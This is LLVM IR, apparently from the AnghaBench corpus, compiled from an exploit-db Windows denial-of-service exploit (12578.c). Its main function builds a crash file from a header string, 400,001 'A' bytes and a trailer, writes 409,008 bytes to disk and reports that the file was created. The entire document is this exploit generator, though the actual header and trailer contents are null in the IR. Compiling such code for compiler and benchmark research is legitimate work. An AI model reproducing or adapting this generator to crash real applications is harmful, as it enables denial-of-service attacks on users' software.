; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_12578.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_12578.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shocks = common dso_local global i8* null, align 8
@shocke = common dso_local global i8* null, align 8
@FFORMAT = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@fp = common dso_local global i32* null, align 8
@.str.1 = private unnamed_addr constant [28 x i8] c"\0AUweeepa! Can't open file.\0A\00", align 1
@.str.2 = private unnamed_addr constant [33 x i8] c"\0AFile %s successfully created!\0A\07\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [409008 x i8], align 16
  %7 = alloca [400001 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %8 = getelementptr inbounds [400001 x i8], [400001 x i8]* %7, i64 0, i64 0
  %9 = call i32 @memset(i8* %8, i32 65, i32 400001)
  %10 = getelementptr inbounds [409008 x i8], [409008 x i8]* %6, i64 0, i64 0
  %11 = load i8*, i8** @shocks, align 8
  %12 = load i8*, i8** @shocks, align 8
  %13 = call i32 @strlen(i8* %12)
  %14 = call i32 @memcpy(i8* %10, i8* %11, i32 %13)
  %15 = getelementptr inbounds [409008 x i8], [409008 x i8]* %6, i64 0, i64 0
  %16 = load i8*, i8** @shocks, align 8
  %17 = call i32 @strlen(i8* %16)
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %15, i64 %18
  %20 = getelementptr inbounds [400001 x i8], [400001 x i8]* %7, i64 0, i64 0
  %21 = getelementptr inbounds [400001 x i8], [400001 x i8]* %7, i64 0, i64 0
  %22 = call i32 @strlen(i8* %21)
  %23 = call i32 @memcpy(i8* %19, i8* %20, i32 %22)
  %24 = getelementptr inbounds [409008 x i8], [409008 x i8]* %6, i64 0, i64 0
  %25 = load i8*, i8** @shocks, align 8
  %26 = call i32 @strlen(i8* %25)
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %24, i64 %27
  %29 = getelementptr inbounds [400001 x i8], [400001 x i8]* %7, i64 0, i64 0
  %30 = call i32 @strlen(i8* %29)
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8*, i8** @shocke, align 8
  %34 = load i8*, i8** @shocke, align 8
  %35 = call i32 @strlen(i8* %34)
  %36 = call i32 @memcpy(i8* %32, i8* %33, i32 %35)
  %37 = load i8*, i8** @FFORMAT, align 8
  %38 = call i32* @fopen(i8* %37, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0))
  store i32* %38, i32** @fp, align 8
  %39 = load i32*, i32** @fp, align 8
  %40 = icmp eq i32* %39, null
  br i1 %40, label %41, label %43

41:                                               ; preds = %2
  %42 = call i32 @perror(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0))
  br label %43

43:                                               ; preds = %41, %2
  %44 = getelementptr inbounds [409008 x i8], [409008 x i8]* %6, i64 0, i64 0
  %45 = load i32*, i32** @fp, align 8
  %46 = call i32 @fwrite(i8* %44, i32 1, i32 409008, i32* %45)
  %47 = load i32*, i32** @fp, align 8
  %48 = call i32 @fclose(i32* %47)
  %49 = load i8*, i8** @FFORMAT, align 8
  %50 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.2, i64 0, i64 0), i8* %49)
  ret i32 0
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @printf(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
